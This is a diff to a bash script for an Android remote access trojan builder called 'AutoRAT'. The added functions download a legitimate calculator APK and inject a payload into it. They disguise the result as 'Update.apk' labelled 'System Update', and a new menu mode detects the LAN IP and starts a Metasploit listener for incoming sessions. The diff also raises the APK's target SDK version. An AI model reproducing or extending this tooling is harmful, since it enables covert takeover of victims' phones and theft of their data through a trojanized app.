@@ -56,11 +56,67 @@ stop_tunnel() {
     info "LAN mode stopped"
 }
 
+download_base_apk() {
+    local outdir="$SCRIPT_DIR/payloads"
+    mkdir -p "$outdir"
+    local outpath="$outdir/base.apk"
+
+    if [ -f "$outpath" ] && [ -s "$outpath" ]; then
+        echo "$outpath"
+        return 0
+    fi
+
+    info "Downloading base APK (Simple Calculator)..."
+
+    local json apk_name dl_url
+    json=$(curl -sL "https://f-droid.org/api/v1/packages/com.simplemobiletools.calculator" 2>&1) || {
+        warn "F-Droid API unreachable, trying direct download..."
+    }
+
+    if [ -n "$json" ]; then
+        apk_name=$(echo "$json" | python3 -c "import sys,json; print(json.load(sys.stdin)['apkName'])" 2>/dev/null)
+        dl_url="https://f-droid.org/repo/$apk_name"
+    fi
+
+    if [ -z "$dl_url" ]; then
+        dl_url="https://github.com/rizqihasanfadilla01-cmd/android_rat/releases/download/v1/base.apk"
+    fi
+
+    curl -sL -o "$outpath" "$dl_url" || {
+        err "Failed to download base APK"
+        return 1
+    }
+
+    if [ ! -s "$outpath" ]; then
+        err "Downloaded APK is empty"
+        return 1
+    fi
+
+    local size
+    size=$(stat -c%s "$outpath" 2>/dev/null)
+    ok "Base APK downloaded ($(awk "BEGIN {printf \"%.1f\", $size/1024}") KB)"
+    echo "$outpath"
+}
+
+inject_payload() {
+    local lhost="$1" lport="$2" outname="$3" appname="$4"
+    [ -z "$lhost" ] && { err "LHOST required."; return 1; }
+    [ -z "$lport" ] && lport=$LPORT
+    [ -z "$outname" ] && outname="Update.apk"
+    [ -z "$appname" ] && appname="System Update"
+
+    local base_apk
+    base_apk=$(download_base_apk) || return 1
+
+    info "Injecting payload into legitimate APK..."
+    build_payload "$lhost" "$lport" "$base_apk" "$outname" "$appname"
+}
+
 fix_apk_compat() {
     local apk="$1"
     local outdir="/tmp/apk_fix_$(date +%s)"
 
-    info "Fixing APK compatibility (minSdk=21, targetSdk=34, exported)..."
+    info "Fixing APK compatibility (minSdk=21, targetSdk=35, exported)..."
 
     if ! command -v apktool &>/dev/null; then
         info "Installing apktool..."
@@ -83,9 +139,13 @@ fix_apk_compat() {
 
     sed -i 's|android:minSdkVersion="[0-9]*"|android:minSdkVersion="21"|g' "$outdir/AndroidManifest.xml"
     if grep -q 'android:targetSdkVersion' "$outdir/AndroidManifest.xml"; then
-        sed -i 's|android:targetSdkVersion="[0-9]*"|android:targetSdkVersion="34"|g' "$outdir/AndroidManifest.xml"
+        sed -i 's|android:targetSdkVersion="[0-9]*"|android:targetSdkVersion="35"|g' "$outdir/AndroidManifest.xml"
     else
-        sed -i 's|<uses-sdk|<uses-sdk android:targetSdkVersion="34"|' "$outdir/AndroidManifest.xml"
+        sed -i 's|<uses-sdk|<uses-sdk android:targetSdkVersion="35"|' "$outdir/AndroidManifest.xml"
+    fi
+
+    if [ -f "$outdir/apktool.yml" ]; then
+        sed -i "s/targetSdkVersion: '[0-9]*'/targetSdkVersion: '35'/" "$outdir/apktool.yml"
     fi
 
     for tag in activity receiver service provider; do
@@ -184,6 +244,33 @@ show_sessions() {
     echo 'sessions -l' | msfconsole -q
 }
 
+start_autorat_inject() {
+    local outname="$1" appname="$2"
+    [ -z "$outname" ] && outname="Update.apk"
+    [ -z "$appname" ] && appname="System Update"
+
+    banner
+    info "===== AutoRAT (Inject into Legitimate APK) ====="
+
+    info "[1/3] Detecting LAN IP..."
+    start_lan || { err "Aborting."; return 1; }
+
+    local lhost="${TUNNEL_ADDR%:*}"
+    local lport="${TUNNEL_ADDR##*:}"
+
+    info "[2/3] Injecting payload..."
+    local apk
+    apk=$(inject_payload "$lhost" "$lport" "$outname" "$appname")
+    [ -z "$apk" ] && { err "Aborting."; stop_tunnel; return 1; }
+
+    info "[3/3] Starting listener..."
+    start_listener
+
+    stop_listener
+    stop_tunnel
+    ok "Done"
+}
+
 start_autorat() {
     local template="$1" outname="$2" appname="$3"
     [ -z "$outname" ] && outname="Update.apk"
@@ -240,6 +327,7 @@ main_menu() {
         echo "  [1] Detect LAN IP"
         echo "  [2] Build Payload APK"
         echo "  [3] Auto Mode (LAN + Payload + Listener)"
+        echo "  [A] Auto Mode INJECT (LAN + Injection + Listener)"
         echo "  [4] Start Listener (wait session)"
         echo "  [5] Show Sessions"
         echo "  [6] Stop All"
@@ -273,6 +361,17 @@ main_menu() {
                 warn "Press Ctrl+C to stop listener."
                 read -rp "Continue? (y/n): " yn
                 [ "$yn" = "y" ] && start_autorat "" "$nm" "$an"
+                read -rp "Press Enter..."
+                ;;
+            a|A)
+                read -rp "Output APK name (default: Update.apk): " nm
+                nm="${nm:-Update.apk}"
+                read -rp "App name (default: System Update): " an
+                an="${an:-System Update}"
+                warn "Downloads legitimate APK + injects payload."
+                warn "Press Ctrl+C to stop listener."
+                read -rp "Continue? (y/n): " yn
+                [ "$yn" = "y" ] && start_autorat_inject "$nm" "$an"
                 read -rp "Press Enter..."
                 ;;
             4) start_listener; read -rp "Press Enter..." ;;
